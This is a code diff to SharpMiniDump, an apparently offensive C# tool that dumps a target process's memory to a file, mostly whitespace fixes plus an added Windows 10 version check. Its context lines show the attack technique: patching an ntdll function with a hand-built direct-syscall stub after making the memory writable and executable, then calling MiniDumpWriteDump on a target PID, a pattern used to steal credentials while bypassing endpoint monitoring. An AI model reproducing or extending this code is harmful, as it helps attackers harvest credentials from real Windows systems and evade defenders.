@@ -15,7 +15,7 @@ namespace SharpMiniDump
     {
         static void Main(string[] args)
         {
-            
+
             if (IntPtr.Size != 8)
             {
                 return;
@@ -43,7 +43,12 @@ namespace SharpMiniDump
 
             pWinVerInfo.chOSMajorMinor = osInfo.dwMajorVersion + "." + osInfo.dwMinorVersion;
 
-            Console.WriteLine("OS MajorMinor version : " + pWinVerInfo.chOSMajorMinor);
+            Console.WriteLine("[x] OS MajorMinor version : " + pWinVerInfo.chOSMajorMinor);
+            if(!pWinVerInfo.chOSMajorMinor.Equals("10.0"))
+            {
+                Console.WriteLine("[x] Windows 10 - Windows Server 2016 only");
+                return;
+            }
 
             pWinVerInfo.SystemCall = 0x3F;
 
@@ -105,14 +110,14 @@ namespace SharpMiniDump
             long allocationsize = 0;
 
             status = NativeSysCall.NtCreateFile10(
-                out hDmpFile, 
-                (int)Natives.FILE_GENERIC_WRITE, 
-                ref FileObjectAttributes, 
-                out IoStatusBlock, 
+                out hDmpFile,
+                (int)Natives.FILE_GENERIC_WRITE,
+                ref FileObjectAttributes,
+                out IoStatusBlock,
                 ref allocationsize,
-                Natives.FILE_ATTRIBUTE_NORMAL, 
-                System.IO.FileShare.Write, 
-                Natives.FILE_OVERWRITE_IF, 
+                Natives.FILE_ATTRIBUTE_NORMAL,
+                System.IO.FileShare.Write,
+                Natives.FILE_OVERWRITE_IF,
                 Natives.FILE_SYNCHRONOUS_IO_NONALERT,
                 hElm, 0);
 
@@ -135,7 +140,7 @@ namespace SharpMiniDump
             Console.WriteLine("[*] Target PID " + pWinVerInfo.hTargetPID);
             Console.WriteLine("[*] Generating minidump.... " + pWinVerInfo.hTargetPID);
 
-            if (!MiniDumpWriteDump(hProcess, (uint)pWinVerInfo.hTargetPID,hDmpFile,2, ExceptionParam,UserStreamParam,CallbackParam))
+            if (!MiniDumpWriteDump(hProcess, (uint)pWinVerInfo.hTargetPID, hDmpFile, 2, ExceptionParam, UserStreamParam, CallbackParam))
             {
                 Console.WriteLine("[x] Error MiniDumpWriteDump  ");
                 NativeSysCall.ZwClose10(hProcess);
@@ -153,14 +158,14 @@ namespace SharpMiniDump
         {
             byte[] AssemblyBytes = { 0x4C, 0x8B, 0xD1, 0xB8, 0xFF };
             AssemblyBytes[4] = (byte)pWinVerInfo.SystemCall;
-            
+
             IntPtr ntdll = Natives.LoadLibraryA("ntdll.dll");
             IntPtr proc = Natives.GetProcAddress(ntdll, pWinVerInfo.lpApiCall);
 
             IntPtr lpBaseAddress = proc;
             uint OldProtection = 0;
             uint NewProtection = 0;
-            uint uSize = 10 ;
+            uint uSize = 10;
             var status = NativeSysCall.ZwProtectVirtualMemory10(Process.GetCurrentProcess().Handle, ref lpBaseAddress, ref uSize, 0x40, ref OldProtection);
             if (status != Natives.NTSTATUS.Success)
             {
@@ -190,7 +195,7 @@ namespace SharpMiniDump
 
             return true;
         }
-        
+
         private static bool IsElevated()
         {
             return TokenIsElevated(GetCurrentProcessToken());
@@ -266,6 +271,6 @@ namespace SharpMiniDump
 
             return true;
         }
-        
+
     }
 }
